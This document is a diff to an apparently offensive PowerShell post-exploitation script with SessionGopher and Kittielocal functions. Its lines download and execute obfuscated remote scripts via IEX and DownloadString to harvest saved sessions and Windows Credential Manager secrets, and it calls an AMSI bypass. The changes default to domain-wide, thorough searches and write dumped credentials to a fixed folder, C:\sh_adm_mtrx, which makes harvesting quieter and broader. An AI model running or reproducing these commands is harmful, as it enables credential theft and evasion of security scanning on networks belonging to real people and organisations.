@@ -95,7 +95,7 @@ function SessionGopher
     if(!$consoleoutput){pathcheck}
     $currentPath = (Get-Item -Path "C:\sh_adm_mtrx" -Verbose).FullName
     IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/segoph.ps1')
-    $whole_domain = "no"
+    $whole_domain = "yes"
     if (!$noninteractive){$whole_domain = Read-Host -Prompt 'Do you want to start SessionGopher search over the whole domain? (yes/no) - takes a lot of time'}
     if ($whole_domain -eq "yes" -or $whole_domain -eq "y" -or $whole_domain -eq "Yes" -or $whole_domain -eq "Y")
     {
@@ -113,7 +113,7 @@ function SessionGopher
     }
     else
     {
-        $session = "no"
+        $session = "yes"
 	    if(!$noninteractive)
         {
             $session = Read-Host -Prompt 'Do you want to start SessionGopher with thorough tests? (yes/no) - takes a lot of time'
@@ -171,7 +171,7 @@ function Kittielocal
         [Switch]
         $teamviewer
     )
-    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+    $currentPath = (Get-Item -Path "C:\sh_adm_mtrx" -Verbose).FullName
     if(!$consoleoutput){pathcheck}
     AmsiBypass
     if ($noninteractive)
@@ -179,8 +179,8 @@ function Kittielocal
         if ($credentialmanager)
         {
             iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/DumpWCM.ps1')
-            Write-Host "Dumping now, output goes to .\Exploitation\WCMCredentials.txt"
-            if(!$consoleoutput){Invoke-WCMDump >> $currentPath\Exploitation\WCMCredentials.txt}else{Invoke-WCMDump}
+            Write-Host "Dumping now, output goes to C:\sh_adm_mtrx\WCMCredentials.txt"
+            if(!$consoleoutput){Invoke-WCMDump >> C:\sh_adm_mtrx\WCMCredentials.txt}else{Invoke-WCMDump}
         }
         if($mimikittie)
         {
